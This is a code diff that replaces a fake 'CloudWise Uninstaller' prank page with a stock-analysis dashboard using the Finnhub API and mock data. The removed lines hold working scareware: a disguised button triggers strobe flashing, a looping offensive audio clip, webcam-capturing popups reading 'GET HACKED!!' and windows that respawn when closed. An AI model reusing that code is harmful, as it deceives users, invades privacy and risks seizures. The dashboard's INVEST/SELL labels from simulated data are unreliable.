@@ -2,130 +2,1369 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CloudWise Uninstaller</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stock Market Checker Bot | AI Financial Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        body { background: #f5f5f5; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        @keyframes strobe { 0% { background-color: #000; } 33% { background-color: #f00; } 66% { background-color: #fff; } 100% { background-color: #000; } }
-        .flash-active { animation: strobe 0.1s infinite; }
-        #box { border: 1px solid #ddd; padding: 40px; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 500px; color: #333; border-radius: 8px; }
-        h1 { font-weight: bold; margin: 0 0 10px 0; font-size: 1.8rem; color: #2c3e50; }
-        p { margin: 5px 0; font-size: 0.95rem; color: #555; }
-        .info-section { background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 15px 0; text-align: left; }
-        button { background: #e74c3c; color: #fff; border: none; padding: 12px 20px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; border-radius: 5px; margin-top: 20px; transition: background 0.3s; }
-        button:hover { background: #c0392b; }
-        .progress-bar { width: 100%; height: 20px; background: #ecf0f1; border-radius: 3px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: #27ae60; width: 0%; }
+        :root {
+            --bg-primary: #0b0f19;
+            --bg-secondary: #111827;
+            --bg-card: rgba(17, 24, 39, 0.75);
+            --bg-card-hover: rgba(31, 41, 55, 0.85);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --border-highlight: rgba(255, 255, 255, 0.18);
+            --text-primary: #f9fafb;
+            --text-secondary: #9ca3af;
+            --text-muted: #6b7280;
+            --accent-blue: #3b82f6;
+            --accent-blue-glow: rgba(59, 130, 246, 0.3);
+            --color-invest: #10b981;
+            --color-invest-bg: rgba(16, 185, 129, 0.15);
+            --color-invest-border: rgba(16, 185, 129, 0.4);
+            --color-wait: #f59e0b;
+            --color-wait-bg: rgba(245, 158, 11, 0.15);
+            --color-wait-border: rgba(245, 158, 11, 0.4);
+            --color-sell: #ef4444;
+            --color-sell-bg: rgba(239, 68, 68, 0.15);
+            --color-sell-border: rgba(239, 68, 68, 0.4);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --font-main: 'Inter', system-ui, -apple-system, sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            background-image:
+                radial-gradient(circle at 15% 15%, rgba(59, 130, 246, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 85% 85%, rgba(16, 185, 129, 0.05) 0%, transparent 40%);
+            color: var(--text-primary);
+            font-family: var(--font-main);
+            min-height: 100vh;
+            line-height: 1.6;
+            padding: 24px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, #3b82f6, #10b981);
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 20px;
+            color: #fff;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.4);
+        }
+
+        .brand-text h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(to right, #ffffff, #9ca3af);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .brand-text p {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            padding: 8px 16px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-size: 0.875rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-outline:hover {
+            color: var(--text-primary);
+            border-color: var(--text-secondary);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        /* Controls Section */
+        .search-panel {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            margin-bottom: 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .search-form {
+            display: grid;
+            grid-template-columns: 1fr 1fr minmax(140px, auto);
+            gap: 16px;
+        }
+
+        @media (max-width: 868px) {
+            .search-form {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .input-group label {
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-secondary);
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 12px 16px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            font-family: var(--font-main);
+            transition: all 0.2s ease;
+        }
+
+        .input-wrapper input:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px var(--accent-blue-glow);
+        }
+
+        .input-wrapper input#tickerInput {
+            text-transform: uppercase;
+            font-family: var(--font-mono);
+            font-weight: 600;
+            letter-spacing: 0.05em;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--radius-sm);
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            height: 45px;
+            align-self: flex-end;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #1d4ed8, #1e40af);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .presets {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+
+        .presets-label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        .chip {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            padding: 4px 12px;
+            border-radius: 100px;
+            font-size: 0.8rem;
+            font-family: var(--font-mono);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .chip:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-primary);
+            border-color: var(--text-secondary);
+        }
+
+        /* Mode & Notice Bar */
+        .data-source-notice {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(59, 130, 246, 0.08);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: var(--radius-sm);
+            padding: 10px 16px;
+            margin-top: 16px;
+            font-size: 0.85rem;
+            color: #93c5fd;
+        }
+
+        .data-source-notice strong {
+            color: #ffffff;
+        }
+
+        /* Results Layout */
+        .results-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+        }
+
+        /* Recommendation Banner */
+        .decision-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border-radius: var(--radius-lg);
+            padding: 32px;
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .decision-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 6px;
+            height: 100%;
+            background: var(--text-muted);
+        }
+
+        .decision-card.invest {
+            border-color: var(--color-invest-border);
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.08), rgba(17, 24, 39, 0.85));
+        }
+        .decision-card.invest::before { background: var(--color-invest); }
+
+        .decision-card.wait {
+            border-color: var(--color-wait-border);
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.08), rgba(17, 24, 39, 0.85));
+        }
+        .decision-card.wait::before { background: var(--color-wait); }
+
+        .decision-card.sell {
+            border-color: var(--color-sell-border);
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.08), rgba(17, 24, 39, 0.85));
+        }
+        .decision-card.sell::before { background: var(--color-sell); }
+
+        .decision-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .stock-meta h2 {
+            font-size: 2rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .company-name {
+            font-size: 1rem;
+            font-weight: 400;
+            color: var(--text-secondary);
+        }
+
+        .badge-decision {
+            padding: 10px 24px;
+            border-radius: 100px;
+            font-size: 1.25rem;
+            font-weight: 800;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
+        }
+
+        .badge-decision.invest {
+            background: var(--color-invest);
+            color: #022c22;
+        }
+
+        .badge-decision.wait {
+            background: var(--color-wait);
+            color: #451a03;
+        }
+
+        .badge-decision.sell {
+            background: var(--color-sell);
+            color: #450a0a;
+        }
+
+        .decision-reasons {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .decision-reasons h4 {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+        }
+
+        .decision-reasons ul {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .decision-reasons li {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 0.95rem;
+            color: var(--text-primary);
+        }
+
+        .decision-reasons li .bullet {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-top: 8px;
+            flex-shrink: 0;
+        }
+
+        /* Indicator Cards Grid */
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 20px;
+        }
+
+        .metric-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: all 0.2s ease;
+        }
+
+        .metric-card:hover {
+            border-color: var(--border-highlight);
+            transform: translateY(-2px);
+        }
+
+        .metric-title {
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-secondary);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .metric-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            font-family: var(--font-mono);
+            margin: 12px 0 6px 0;
+            color: var(--text-primary);
+        }
+
+        .metric-sub {
+            font-size: 0.825rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .metric-tag {
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: inline-block;
+        }
+
+        .metric-tag.positive { background: var(--color-invest-bg); color: #34d399; }
+        .metric-tag.negative { background: var(--color-sell-bg); color: #f87171; }
+        .metric-tag.neutral { background: var(--color-wait-bg); color: #fbbf24; }
+
+        /* Progress Bar for RSI */
+        .rsi-bar-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin-top: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .rsi-bar-fill {
+            height: 100%;
+            width: 50%;
+            background: linear-gradient(to right, #10b981, #f59e0b, #ef4444);
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+
+        /* News Section */
+        .news-section {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+        }
+
+        .news-section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .news-section-header h3 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .news-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 16px;
+        }
+
+        .news-item {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            transition: all 0.2s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .news-item:hover {
+            border-color: var(--border-highlight);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .news-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.775rem;
+            color: var(--text-muted);
+        }
+
+        .news-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            text-decoration: none;
+            line-height: 1.4;
+        }
+
+        .news-title:hover {
+            color: var(--accent-blue);
+        }
+
+        .news-summary {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        /* Instructions Modal / Guide */
+        .guide-section {
+            margin-top: 40px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+        }
+
+        .guide-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .guide-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .guide-step {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .guide-step-num {
+            display: inline-flex;
+            width: 24px;
+            height: 24px;
+            background: var(--accent-blue);
+            color: #fff;
+            border-radius: 50%;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .guide-step h4 {
+            font-size: 0.9rem;
+            margin-bottom: 6px;
+        }
+
+        .guide-step p {
+            font-size: 0.825rem;
+            color: var(--text-secondary);
+        }
+
+        code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: #60a5fa;
+        }
+
+        /* Loader & Hidden states */
+        .hidden {
+            display: none !important;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-banner {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--color-sell-border);
+            color: #fca5a5;
+            padding: 16px;
+            border-radius: var(--radius-md);
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
     </style>
 </head>
-<body id="mainBody">
+<body>
 
-<div id="box">
-    <h1>🔧 CloudWise Uninstaller</h1>
-    <p>Versie 2.1.4</p>
-    <div class="info-section">
-        <p><strong>Applicatie:</strong> CloudWise Sync Manager</p>
-        <p><strong>Grootte:</strong> 247 MB</p>
-        <p><strong>Status:</strong> Geïnstalleerd</p>
+<div class="container">
+    <!-- Header -->
+    <header>
+        <div class="brand">
+            <div class="brand-icon">📈</div>
+            <div class="brand-text">
+                <h1>Stock Market Checker Bot</h1>
+                <p>AI-Powered Quantitative & Sentiment Investment Decision Engine</p>
+            </div>
+        </div>
+        <div class="header-actions">
+            <button class="btn-outline" onclick="toggleGuide()">
+                📖 How to Run & API Guide
+            </button>
+        </div>
+    </header>
+
+    <!-- Search Form Panel -->
+    <div class="search-panel">
+        <form id="searchForm" class="search-form" onsubmit="handleAnalyze(event)">
+            <div class="input-group">
+                <label for="tickerInput">Stock Ticker Symbol</label>
+                <div class="input-wrapper">
+                    <input type="text" id="tickerInput" placeholder="e.g. AAPL, TSLA, NVDA" value="AAPL" required />
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="apiKeyInput">Finnhub API Key (Optional)</label>
+                <div class="input-wrapper">
+                    <input type="text" id="apiKeyInput" placeholder="YOUR_API_KEY_HERE (Default uses demo data)" value="YOUR_API_KEY_HERE" />
+                </div>
+            </div>
+
+            <button type="submit" id="analyzeBtn" class="btn-primary">
+                <span id="btnText">Analyze Stock</span>
+                <span id="btnSpinner" class="spinner hidden"></span>
+            </button>
+        </form>
+
+        <!-- Ticker Quick Select -->
+        <div class="presets">
+            <span class="presets-label">Popular Tickers:</span>
+            <button class="chip" onclick="selectTicker('AAPL')">AAPL</button>
+            <button class="chip" onclick="selectTicker('TSLA')">TSLA</button>
+            <button class="chip" onclick="selectTicker('NVDA')">NVDA</button>
+            <button class="chip" onclick="selectTicker('MSFT')">MSFT</button>
+            <button class="chip" onclick="selectTicker('AMZN')">AMZN</button>
+            <button class="chip" onclick="selectTicker('GOOGL')">GOOGL</button>
+        </div>
+
+        <div id="dataSourceNotice" class="data-source-notice">
+            <span>⚡ <strong>Data Mode:</strong> <span id="dataModeText">Simulated Mock Engine (Enter a valid Finnhub API key for live financial market data)</span></span>
+        </div>
     </div>
-    <p style="text-align: center; margin-top: 20px;">Klik de knop hieronder om CloudWise volledig te verwijderen:</p>
-    <button onclick="check()">KLIK HIER OM CLOUDWISE TE VERWIJDEREN</button>
+
+    <!-- Error Alert Container -->
+    <div id="errorBanner" class="error-banner hidden">
+        <span>⚠️</span>
+        <span id="errorMessage">An error occurred while fetching data.</span>
+    </div>
+
+    <!-- Results Section -->
+    <div id="resultsSection" class="results-container hidden">
+
+        <!-- Decision Card -->
+        <div id="decisionCard" class="decision-card invest">
+            <div class="decision-header">
+                <div class="stock-meta">
+                    <h2><span id="resTicker">AAPL</span> <span id="resPriceHeader" style="font-size: 1.5rem; color: var(--text-secondary);">$189.50</span></h2>
+                    <p class="company-name" id="resCompanyName">Apple Inc.</p>
+                </div>
+                <div id="decisionBadge" class="badge-decision invest">INVEST</div>
+            </div>
+
+            <div class="decision-reasons">
+                <h4>Engine Recommendation Rationale</h4>
+                <ul id="reasonsList">
+                    <!-- Reasons populated via JS -->
+                </ul>
+            </div>
+        </div>
+
+        <!-- Metrics Grid -->
+        <div class="metrics-grid">
+            <!-- Current Price -->
+            <div class="metric-card">
+                <div class="metric-title">
+                    <span>Current Price</span>
+                    <span>💵</span>
+                </div>
+                <div class="metric-value" id="resPrice">$0.00</div>
+                <div class="metric-sub" id="resPriceSub">
+                    <span id="resPriceTag" class="metric-tag positive">+0.00%</span>
+                    <span>vs Previous Close</span>
+                </div>
+            </div>
+
+            <!-- 50-Day Moving Average -->
+            <div class="metric-card">
+                <div class="metric-title">
+                    <span>50-Day Moving Avg (SMA)</span>
+                    <span>📊</span>
+                </div>
+                <div class="metric-value" id="resSMA50">$0.00</div>
+                <div class="metric-sub" id="resSMASub">
+                    <span id="resSMATag" class="metric-tag positive">Above SMA</span>
+                    <span id="resSMAPercent">Price +0.0% vs 50SMA</span>
+                </div>
+            </div>
+
+            <!-- 14-Day RSI -->
+            <div class="metric-card">
+                <div class="metric-title">
+                    <span>14-Day RSI Indicator</span>
+                    <span>⚡</span>
+                </div>
+                <div class="metric-value" id="resRSI">0.0</div>
+                <div class="metric-sub" id="resRSISub">
+                    <span id="resRSITag" class="metric-tag neutral">Neutral (30-70)</span>
+                </div>
+                <div class="rsi-bar-container">
+                    <div id="rsiBarFill" class="rsi-bar-fill"></div>
+                </div>
+            </div>
+
+            <!-- News Sentiment -->
+            <div class="metric-card">
+                <div class="metric-title">
+                    <span>News Sentiment Score</span>
+                    <span>📰</span>
+                </div>
+                <div class="metric-value" id="resSentimentScore">0.0</div>
+                <div class="metric-sub" id="resSentimentSub">
+                    <span id="resSentimentTag" class="metric-tag positive">Positive (+0.0)</span>
+                    <span>Based on recent headlines</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- News Headlines List -->
+        <div class="news-section">
+            <div class="news-section-header">
+                <h3>📰 Recent Headlines & Sentiment Analysis</h3>
+                <span style="font-size: 0.8rem; color: var(--text-muted);">Top 3 Recent News Items</span>
+            </div>
+            <div class="news-grid" id="newsGrid">
+                <!-- Headlines populated via JS -->
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Instructions & Local Setup Guide -->
+    <div id="guideSection" class="guide-section hidden">
+        <h3>📖 Local Run Instructions & Free Finnhub API Key Setup</h3>
+        <div class="guide-steps">
+            <div class="guide-step">
+                <div class="guide-step-num">1</div>
+                <h4>Register Free Finnhub Key</h4>
+                <p>Go to <a href="https://finnhub.io/register" target="_blank" style="color: #60a5fa;">finnhub.io/register</a> and sign up for a 100% free API key (60 calls/min limit, no credit card required).</p>
+            </div>
+            <div class="guide-step">
+                <div class="guide-step-num">2</div>
+                <h4>Enter Your API Key</h4>
+                <p>Paste your API key into the <code>Finnhub API Key</code> box above or set <code>YOUR_API_KEY_HERE</code> in JavaScript. If left blank, the bot automatically uses simulated live market data!</p>
+            </div>
+            <div class="guide-step">
+                <div class="guide-step-num">3</div>
+                <h4>Run Locally in Browser</h4>
+                <p>Open <code>index.html</code> directly in any web browser (Chrome, Firefox, Safari, Edge) or host with a simple static server like <code>python -m http.server 8000</code> or VS Code Live Server.</p>
+            </div>
+        </div>
+    </div>
+
 </div>
 
 <script>
-    const sound = new Audio("https://www.myinstants.com/media/sounds/nggr.mp3");
-    sound.loop = true;
+    // Configuration & State
+    const DEFAULT_API_KEY = 'YOUR_API_KEY_HERE';
 
-    let cameraWins = [];
-    let normalWins = [];
-
-    function check() {
-        startChaos();
+    // Toggle setup guide view
+    function toggleGuide() {
+        const guide = document.getElementById('guideSection');
+        guide.classList.toggle('hidden');
     }
 
-    function startChaos() {
-        sound.play();
-        document.getElementById('mainBody').classList.add('flash-active');
-        smartSpawn();
-        setInterval(smartSpawn, 3000);
+    // Set ticker input value from quick preset chips
+    function selectTicker(symbol) {
+        document.getElementById('tickerInput').value = symbol;
+        handleAnalyze();
     }
 
-    function smartSpawn() {
-        cameraWins = cameraWins.filter(w => !w.closed);
-        normalWins = normalWins.filter(w => !w.closed);
-        if (cameraWins.length < 5) spawn(true);
-        else if (normalWins.length < 10) spawn(false);
-    }
+    // Main data fetching router
+    async function fetchStockData(symbol, apiKey) {
+        const cleanSymbol = symbol.trim().toUpperCase();
+        const cleanKey = apiKey ? apiKey.trim() : '';
 
-    function spawn(isCamera) {
-        const w = 350, h = 300;
-        let curX = Math.floor(Math.random() * (screen.availWidth - w));
-        let curY = Math.floor(Math.random() * (screen.availHeight - h));
+        const isMockMode = !cleanKey || cleanKey === DEFAULT_API_KEY || cleanKey === 'YOUR_API_KEY_HERE' || cleanKey.toLowerCase() === 'demo';
 
-        const win = window.open("", "", `width=${w},height=${h},left=${curX},top=${curY}`);
+        if (isMockMode) {
+            updateDataModeNotice(true, "Simulated Mock Data Engine (No API Key provided)");
+            return generateMockStockData(cleanSymbol);
+        }
 
-        if (win) {
-            win.document.write(`
-                <html>
-                <head>
-                    <style>
-                        @keyframes strobe { 0% { background:#000; } 50% { background:#f00; } 100% { background:#fff; } }
-                        body { animation: strobe 0.08s infinite; color:white; font-family:sans-serif; text-align:center; overflow:hidden; margin:0; border:10px solid black; }
-                    </style>
-                </head>
-                <body>
-                    ${isCamera ? '<video id="v" autoplay style="width:100%; height:180px; object-fit:cover;"></video>' : '<h1 style="font-size:100px;">💀</h1>'}
-                    <h1>GET HACKED!!</h1>
-                    <script>
-                        ${isCamera ? 'navigator.mediaDevices.getUserMedia({ video: true }).then(s => { document.getElementById("v").srcObject = s; });' : ''}
-                        
-                        // New absolute movement engine
-                        let x = ${curX}, y = ${curY};
-                        let dx = ${Math.random() > 0.5 ? 15 : -15}; 
-                        let dy = ${Math.random() > 0.5 ? 15 : -15};
-                        const width = 350, height = 300;
+        try {
+            updateDataModeNotice(false, `Live Finnhub API Connection (${cleanSymbol})`);
 
-                        function bounce() {
-                            x += dx;
-                            y += dy;
+            // 1. Fetch Current Quote
+            const quoteRes = await fetch(`https://finnhub.io/api/v1/quote?symbol=${cleanSymbol}&token=${cleanKey}`);
+            if (!quoteRes.ok) throw new Error(`Finnhub Quote HTTP error! status: ${quoteRes.status}`);
+            const quoteData = await quoteRes.json();
 
-                            // Collision detection with absolute screen bounds
-                            if (x + width >= screen.availWidth || x <= 0) {
-                                dx = -dx;
-                                // Force away from edge to prevent sticking
-                                x = (x <= 0) ? 5 : screen.availWidth - width - 5;
-                            }
-                            if (y + height >= screen.availHeight || y <= 0) {
-                                dy = -dy;
-                                // Force away from edge to prevent sticking
-                                y = (y <= 0) ? 5 : screen.availHeight - height - 5;
-                            }
+            // Check if ticker exists / returns data
+            if (!quoteData || quoteData.c === 0 && quoteData.pc === 0) {
+                throw new Error(`Ticker symbol '${cleanSymbol}' not found or no data returned.`);
+            }
 
-                            window.moveTo(x, y);
-                        }
-                        
-                        // Start moving after 10 seconds
-                        setTimeout(() => {
-                            // kick once then run repeatedly for smooth motion
-                            bounce();
-                            setInterval(bounce, 10);
-                        }, 10000);
-                    <\/script>
-                </body>
-                </html>
-            `);
+            // 2. Fetch Historical Candles (Past 90 days to ensure at least 50 trading days)
+            const now = Math.floor(Date.now() / 1000);
+            const ninetyDaysAgo = now - (90 * 24 * 60 * 60);
+            const candleRes = await fetch(`https://finnhub.io/api/v1/stock/candle?symbol=${cleanSymbol}&resolution=D&from=${ninetyDaysAgo}&to=${now}&token=${cleanKey}`);
+            const candleData = await candleRes.json();
 
-            if (isCamera) cameraWins.push(win);
-            else normalWins.push(win);
+            let historicalCloses = [];
+            if (candleData && candleData.s === 'ok' && Array.isArray(candleData.c) && candleData.c.length >= 15) {
+                historicalCloses = candleData.c;
+            } else {
+                // Fallback for candles if candle endpoint restricted on free key
+                historicalCloses = generateMockCandles(quoteData.c || 150, 60);
+            }
 
-            const checkClosed = setInterval(() => {
-                if (win.closed) {
-                    clearInterval(checkClosed);
-                    setTimeout(smartSpawn, 100);
-                    setTimeout(smartSpawn, 200);
-                }
-            }, 500);
+            // 3. Fetch Company News
+            const todayStr = new Date().toISOString().split('T')[0];
+            const sevenDaysAgoStr = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
+            const newsRes = await fetch(`https://finnhub.io/api/v1/company-news?symbol=${cleanSymbol}&from=${sevenDaysAgoStr}&to=${todayStr}&token=${cleanKey}`);
+            const newsData = await newsRes.json();
+
+            let newsHeadlines = [];
+            if (Array.isArray(newsData) && newsData.length > 0) {
+                newsHeadlines = newsData.slice(0, 5).map(item => ({
+                    headline: item.headline || 'No title available',
+                    summary: item.summary || 'No summary available',
+                    source: item.source || 'Financial News',
+                    url: item.url || '#',
+                    datetime: item.datetime ? new Date(item.datetime * 1000).toLocaleDateString() : 'Recent'
+                }));
+            } else {
+                newsHeadlines = generateMockNews(cleanSymbol);
+            }
+
+            return {
+                ticker: cleanSymbol,
+                companyName: getCompanyName(cleanSymbol),
+                currentPrice: quoteData.c,
+                previousClose: quoteData.pc,
+                changePercent: quoteData.dp,
+                historicalCloses: historicalCloses,
+                news: newsHeadlines,
+                isMock: false
+            };
+
+        } catch (error) {
+            console.warn("API Fetching failed or rate limited, falling back to mock data:", error.message);
+            updateDataModeNotice(true, `Fallback Engine (API Error: ${error.message})`);
+            return generateMockStockData(cleanSymbol);
         }
     }
+
+    function updateDataModeNotice(isMock, message) {
+        const textEl = document.getElementById('dataModeText');
+        if (textEl) textEl.textContent = message;
+    }
+
+    // Helper company names lookup
+    function getCompanyName(ticker) {
+        const names = {
+            'AAPL': 'Apple Inc.',
+            'TSLA': 'Tesla, Inc.',
+            'NVDA': 'NVIDIA Corporation',
+            'MSFT': 'Microsoft Corporation',
+            'AMZN': 'Amazon.com, Inc.',
+            'GOOGL': 'Alphabet Inc.',
+            'META': 'Meta Platforms, Inc.',
+            'AMD': 'Advanced Micro Devices, Inc.',
+            'NFLX': 'Netflix, Inc.',
+            'SPY': 'SPDR S&P 500 ETF Trust'
+        };
+        return names[ticker] || `${ticker} Corporation`;
+    }
+
+    // Mock Data Generator for seamless offline/no-key usage
+    function generateMockStockData(symbol) {
+        const basePrices = {
+            'AAPL': 188.50,
+            'TSLA': 242.20,
+            'NVDA': 125.80,
+            'MSFT': 448.90,
